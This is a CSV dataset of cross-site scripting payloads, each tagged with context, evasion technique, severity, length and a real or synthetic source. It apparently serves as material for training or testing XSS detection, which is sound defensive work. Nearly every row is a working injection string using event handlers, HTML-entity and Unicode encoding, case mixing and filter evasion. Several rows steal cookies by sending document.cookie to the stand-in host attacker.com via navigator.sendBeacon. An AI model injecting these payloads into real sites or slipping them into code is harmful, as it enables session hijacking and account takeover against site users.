payload,context,technique,severity,length,source
onscrollsnapchange=confirm/*x*/(%27XSS%27),event_handler,synthetic,low,42,synthetic
<script onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,88,synthetic
<vid&#101;o onclick=consol&#101;.log('XSS')>,tag_injection,synthetic,low,44,synthetic
"<style>:target {color:red;}</style><hr id=x style=""transition:color 1s"" ontransitionend=alert(1)></hr>",tag_injection,none,medium,102,real
"""%3E%3Cobject onsubmit=confirm(location.hash)%3E",tag_injection,synthetic,medium,48,synthetic
%22 onerror=console.log(document.domain) %22,attribute_escape,synthetic,medium,44,synthetic
%3Ctr onpointerrawupdate=alert(location.hash)%3E,tag_injection,synthetic,medium,48,synthetic
"<vid&#101;o/onp&#97;st&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,84,synthetic
"<xmp x=y onfocusout=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,58,synthetic
"setInterval(""alert(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink,synthetic,high,80,synthetic
<listing onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,68,synthetic
<optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>,tag_injection,none,medium,57,real
"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable style=display:block>drop here</rp>",tag_injection,none,medium,125,real
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",tag_injection,none,medium,160,real
"<body
onbeforecut=confirm(document.domain)>",tag_injection,synthetic,medium,43,synthetic
document.querySelector(%22body%22).innerHTML+=%22alert(%27XSS%27)%22,dom_sink,synthetic,high,68,synthetic
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,tag_injection,none,medium,60,real
`><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,53,synthetic
'%3E%3Cimg src=x oncontextmenu=alert(1)%3E,attribute_escape,synthetic,medium,42,synthetic
 onload=confirm(location.hash),event_handler,synthetic,medium,30,synthetic
"<center onmouseup=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,51,real
#{{AleRt('XSS')}},template_injection,synthetic,medium,17,synthetic
<s onpointerout=alert(1) style=display:block>AnonKryptiQuz</s>,tag_injection,none,medium,62,real
<ifRamE sRc=X oNseCurItyPolIcyVioLatIon=coNfiRm('XSS')>,tag_injection,synthetic,medium,55,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=alert(navigator.sendBeacon('//attacker.com',document.cookie))%3E""",dom_sink,synthetic,high,111,synthetic
 onBegIn=ConSolE.lOg('XSS'),event_handler,synthetic,medium,27,synthetic
"?getURL,javascript:alert(1)"",",js_uri,none,medium,29,real
&quOt; onFocUsiN=cOnsOle.loG(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,52,synthetic
"%3C!--%3E%3Cnoscript onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,76,synthetic
`><img src=x onchange=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
onmouseenter=alert&#40;'XSS'&#41;,event_handler,synthetic,low,33,synthetic
""" oNmoUseOveR=cOnsOle.loG(1) x=""",attribute_escape,synthetic,medium,32,synthetic
	onConTexTmeNu=AleRt('XSS'),event_handler,synthetic,medium,27,synthetic
"\"" oninvalid=alert(document.domain)//",attribute_escape,synthetic,medium,37,synthetic
"<style>:target {color:red;}</style><meter id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></meter>",tag_injection,none,medium,114,real
\' oninv&#97;lid=confirm(1)//,attribute_escape,synthetic,medium,29,synthetic
"%22><img src=x onanimationcancel=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,70,synthetic
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,tag_injection,none,medium,60,real
"LocAtiOn=""jaVasCriPt:EvaL(dOcuMenT.cOokIe)""",dom_sink,synthetic,high,43,synthetic
ondrop=\u0061lert&#40;document.domain&#41;,event_handler,synthetic,low,42,synthetic
"<aside oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
on&#97;uxclick=prompt&#40;1&#41;,event_handler,synthetic,low,32,synthetic
"onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,88,synthetic
`><img src=x ontouchmove=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,43,synthetic
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",tag_injection,none,medium,62,real
&quot; onpopstate=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,40,synthetic
&quot;&gt;&lt;SVG ONLOAD=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(&amp;#x64&amp;#x6f&amp;#x63&amp;#x75&amp;#x6d&amp;#x65&amp;#x6e&amp;#x74&amp;#x2e&amp;#x64&amp;#x6f&amp;#x6d&amp;#x61&amp;#x69&amp;#x6e)&gt;,event_handler,none,low,210,real
"""><input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/AnonKryptiQuz/)>",tag_injection,none,low,82,real
i.contentWindow.alert(1);,dom_sink,none,medium,25,real
"__proto__[""onmozfullscreenchange""]=alert('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,78,synthetic
"\"" ongotpointercapture=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,63,synthetic
"s&#101;tTim&#101;out(""consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",0)",dom_sink,synthetic,low,143,synthetic
%22><script>prompt(location.hash)</script>,script_injection,synthetic,medium,42,synthetic
"<SCRIPT>document.write(""XSS"");</SCRIPT>",dom_sink,case_variation,low,39,real
'><scr	ipt>prompt(location.hash)</scr	ipt>,script_injection,synthetic,medium,42,synthetic
'><Img srC=x onProMptDisMisS=pRomPt(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,51,synthetic
eval(%22alert(document.cookie+%27&loc=%27+location.href)%22),dom_sink,synthetic,high,60,synthetic
"<script>//prompt(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,56,synthetic
"%3C!--%3E%3Carea onended=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,65,synthetic
"<spacer onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,74,real
"<marquee	onpromptdismiss=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,68,synthetic
"%27><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))"")",dom_sink,synthetic,low,112,synthetic
	onSubMit=coNfiRm(DocUmeNt.DomAin),event_handler,synthetic,medium,34,synthetic
"<script\x0Dtype=""text/javascript"">javascript:alert(7178);</script>",script_injection,none,medium,66,real
"<TABLE BACKGROUND=""javascript:alert(3412)"">",js_uri,case_variation,medium,43,real
<emBed	onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,58,synthetic
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationend=""alert(1)""></content>",tag_injection,none,medium,99,real
<!--><base onkeydown=alert('XSS')>,tag_injection,synthetic,medium,34,synthetic
"<style>@keyframes x{}</style><template style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></template>",tag_injection,none,medium,109,real
"""'><img src=xxx:x onerror\x0A=javascript:alert(2357)>",js_uri,none,medium,53,real
' %3E%3Csvg onfocusin=prompt(1)%3E,attribute_escape,synthetic,medium,34,synthetic
"<rt onmousedown=""alert(1)"">AnonKryptiQuz</rt>",tag_injection,none,medium,45,real
\%22 onended=console.log(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=print()></kbd>",tag_injection,none,low,123,real
"<summary onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,74,real
"<scr	ipt
>prompt(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,high,57,synthetic
"<form ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</form>",tag_injection,none,medium,89,real
"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdi>",tag_injection,none,medium,166,real
""" onpagereveal=confirm(document.domain) """,attribute_escape,synthetic,medium,41,synthetic
"""><embed onwebkitfullscreenchange=confirm(location.hash)>",tag_injection,synthetic,medium,57,synthetic
"<datalist onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</datalist>",tag_injection,none,medium,91,real
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",js_uri,none,medium,79,real
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>",tag_injection,none,medium,97,real
"<!--><source onvolumechange=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,67,synthetic
`><img src=x onp&#97;g&#101;hid&#101;=prompt('XSS')>,attribute_escape,synthetic,medium,52,synthetic
<blInk srC=x onMouSeuP=aLerT(1)>,tag_injection,synthetic,medium,32,synthetic
\' onw&#101;bkittr&#97;nsition&#101;nd=confirm(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,medium,71,synthetic
<video contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59,real
 onk&#101;ydown=confirm(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,46,synthetic
"<audio draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</audio>",tag_injection,none,medium,68,real
"%3Cbody	ongesturestart=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
"<xmp x=y ontouch&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,82,synthetic
"<var onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</var>",tag_injection,none,medium,81,real
<&#97; onk&#101;ypr&#101;ss=confirm(1)>,tag_injection,synthetic,medium,39,synthetic
window[%22alert%22](document.domain),dom_sink,synthetic,low,36,synthetic
<script	>alert(1)</script>,script_injection,synthetic,medium,26,synthetic
<%= alert(%27XSS%27) %>,template_injection,synthetic,medium,23,synthetic
onpromptdismiss=prompt&#40;1&#41;,event_handler,synthetic,low,33,synthetic
%27><img src=x onanimationcancel=prompt(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",tag_injection,none,medium,119,real
onk&#101;ydown=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,57,synthetic
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",script_injection,html_entity,low,149,real
"setTimeout(""XMLHttpRequest(1)"",0)",dom_sink,synthetic,high,33,synthetic
%27 onended=console.log(document.domain) %27,attribute_escape,synthetic,medium,44,synthetic
"'><img src=x onplaying=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
JavAscRipT:cOnfIrm/***/(DocUmeNt.DomAin),js_uri,synthetic,low,40,synthetic
"__proto__[""ondragenter""]=console.log(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,75,synthetic
'+confirm(9)&&null==',attribute_escape,none,medium,21,real
""" %3E%3Csvg onended=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,59,synthetic
<image3 onpointerover=alert(1) style=display:block>AnonKryptiQuz</image3>,tag_injection,none,medium,73,real
"<br onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</br>",tag_injection,none,medium,61,real
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<hgroup onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",tag_injection,none,medium,74,real
%22 onfocus=console.log(1) %22,attribute_escape,synthetic,medium,30,synthetic
"\"" onp&#97;us&#101;=confirm(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,medium,55,synthetic
`><img src=x ondragenter=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,44,synthetic
"<u onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,55,real
?__proto__[transport_url]=%3C%2fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2fscript%3Eivl0w,dom_sink,url_encoding,high,95,real
"""><xmp onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,82,synthetic
"document.write(""<img src=x onerror=eval(document.domain)>"")",dom_sink,synthetic,low,59,synthetic
eval(630038579..toString(30))(1),dom_sink,encoding,low,32,real
"<tfoot id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></tfoot>",tag_injection,none,medium,86,real
<a	onkeypress=confirm(1)>,tag_injection,synthetic,medium,25,synthetic
%3Ctable onsearch=prompt(1)/%3E,tag_injection,synthetic,medium,31,synthetic
\' ongesturestart=prompt('XSS')//,attribute_escape,synthetic,medium,33,synthetic
"<frame oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,73,real
&quOt; onBefOrePasTe=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,42,synthetic
\%22 onanimationend=confirm(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
"&lt;BR SIZE=\""&{alert('AnonKryptiQuz')}\""&gt;",generic,none,medium,45,real
<link onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</link><input value=clickme>,tag_injection,none,medium,108,real
"""><img src=x onmouseover=prompt(\u0064ocument.domain);>",tag_injection,unicode_escape,medium,55,real
<iframe2 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</iframe2>,tag_injection,none,medium,76,real
